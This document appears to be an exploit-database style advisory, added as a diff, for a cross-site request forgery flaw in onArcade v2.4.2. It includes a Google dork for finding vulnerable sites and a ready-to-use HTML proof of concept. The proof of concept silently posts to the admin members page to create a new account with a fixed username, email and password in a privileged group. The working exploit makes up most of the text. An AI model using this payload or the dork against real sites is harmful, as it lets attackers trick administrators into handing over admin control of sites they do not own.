@@ -1,0 +1,25 @@
+ # Exploit Title: Cross-Site Request Forgery (Add Admin)
+ # Google Dork: Powered by onArcade v2.4.2
+ # Date: 2018/August/4
+ # Author: r3m0t3nu11[Zero-way]
+ # Software Link: ["http://www.onarcade.com"]
+ # Version: ["Uptodate"]
+
+the appilication is vulnerable to CSRF attack (No CSRF token in place) meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering).
+
+
+
+[P0C]#
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://server/path/admin/members.php?a=add_member&ajax=1"method="POST">
+      <input type="hidden" name="username" value="r3m0t3nu11" />
+      <input type="hidden" name="email" value="l0v3rs14&#64;gmail&#46;com"/>
+      <input type="hidden" name="password" value="123123" />
+      <input type="hidden" name="user&#95;group" value="2" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
